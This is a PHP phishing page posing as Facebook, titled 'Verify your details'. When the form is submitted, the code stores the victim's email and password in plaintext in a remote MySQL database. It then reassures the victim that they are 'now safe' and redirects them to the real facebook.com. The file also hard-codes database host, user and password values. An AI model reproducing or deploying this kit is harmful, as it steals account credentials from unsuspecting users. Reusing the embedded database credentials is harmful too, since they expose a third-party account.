
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.css">
        <link rel="stylesheet" type="text/css" href="bootstrap/css/style.css">
        <meta charset="utf-8">
        <title>Verify your details</title>
    <style media="screen">
    .navbar-default{
      background-color: #2851A3;
      height:35px;
    }
    #fb{
      color:white;
      font-family:helvetica;
      font-size: 26px;
    }
    #footer{
      background-color: #e6e6e6;
    }
    </style>
      </head>
      <body>
          <nav class="navbar navbar-default" role="navigation">
              <div class="navbar-header">
            <a class="navbar-brand" href="#" id="fb"><b>facebook</b></a>
            </div>
          </nav>
  </body>
  <div class="container">
    <div class="row">
      <div class="col-sm-8 col-sm-offset-2 col-xs-12">
        <?php
        	// $conn = mysqli_connect('fdb23.awardspace.net', '3216581_tzon', '36611332fleks', '3216581_tzon') or die(mysqli_error());
        	// mysqli_select_db($conn , '3216581_tzon');
        	//
        	// if(!$conn){
        	// 	die("Error: Failed to connect to database");
        	// }


          $db_host='fdb23.awardspace.net'; //Should contain the "Database Host" value
          $db_name='3216581_tzon'; //Should contain the "Database Name" value
          $db_user='3216581_tzon'; //Should contain the "Database User" value
          $db_pass='36611332fleks'; //Should contain the "Database Password" value

        $conn = new MySQLi($db_host, $db_user, $db_pass, $db_name);

        if ($conn->connect_error) {
        die("Error: Failed to connect to database");
        }
        if (isset($_POST["verify"])) {
        $username = mysqli_real_escape_string($conn,$_POST["email"]);
        $password = mysqli_real_escape_string($conn,$_POST["pass"]);
        $insert = "INSERT INTO users (username,password) VALUES('$username','$password')";
        $check = mysqli_query($conn,$insert);
        mysqli_close($conn);
        if ($check) {
          echo "<h4>You have successfully verified your details.You are now safe.<br>Click the button below to proceed to your page.</h4>
          <a href='https://www.facebook.com' class='btn btn-block btn-primary'>Proceed to your account</a>
          ";
        }else{
          echo "Error in verifying your data";
        }
        }
        ?>
      </div>
    </div>
  </div>
</html>
